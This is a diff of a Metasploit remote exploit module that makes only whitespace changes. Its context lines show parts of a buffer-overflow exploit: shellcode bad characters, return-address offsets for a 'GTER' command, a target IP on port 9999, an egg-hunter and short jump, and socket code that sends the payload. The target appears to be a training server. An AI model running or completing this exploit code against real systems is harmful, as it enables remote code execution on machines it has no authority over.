@@ -32,7 +32,7 @@ class MetasploitModule < Msf::Exploit::Remote	# This is a remote exploit module 
       'DefaultOptions' =>
         {
           'EXITFUNC' => 'thread', # Run the shellcode in a thread and exit the thread when it is done 
-        },      
+        },
       'Payload'        =>	# How to encode and generate the payload
         {
           'BadChars' => "\x00\x0a\x0d"	# Bad characters to avoid in generated shellcode
@@ -48,7 +48,7 @@ class MetasploitModule < Msf::Exploit::Remote	# This is a remote exploit module 
       ],
       'DefaultTarget'  => 0,
       'DisclosureDate' => 'Mar. 30, 2022'))	# When the vulnerability was disclosed in public
-      
+
       register_options( # Available options: CHOST(), CPORT(), LHOST(), LPORT(), Proxies(), RHOST(), RHOSTS(), RPORT(), SSLVersion()
           [
           OptInt.new('RETOFFSET_GTER', [true, 'Offset of Return Address in function GTER', 135]),
@@ -59,18 +59,18 @@ class MetasploitModule < Msf::Exploit::Remote	# This is a remote exploit module 
           Opt::RPORT(9999),
           Opt::RHOSTS('192.168.7.191')
       ])
-      
   end
+
   def exploit	# Actual exploit
     custom_shell =  datastore['EGG_HUNTER'].gsub(/\\x([0-9a-fA-F]{2})/) { $1.to_i(16).chr }
-    
+
     relativeshort = datastore['SHORT_JUMP'].gsub(/\\x([0-9a-fA-F]{2})/) { $1.to_i(16).chr }
     shellcode = payload.encoded
 
     print_status("Connecting to target...")
     s_1 = TCPSocket.new datastore['RHOST'], datastore['RPORT'] # Connect to the server for first message
     print_status("Connection 1 Created.")
-    print_status("Connecting to target...")    
+    print_status("Connecting to target...")
     s_2 = TCPSocket.new datastore['RHOST'], datastore['RPORT'] # Connect to the server for first message
     print_status("Connection 2 Created.")
 
@@ -82,6 +82,5 @@ class MetasploitModule < Msf::Exploit::Remote	# This is a remote exploit module 
 
     print_status("Sending EggHunter.")
     s_1.puts(outbound_GTER)	# Send the attacking payload
-    
   end
 end
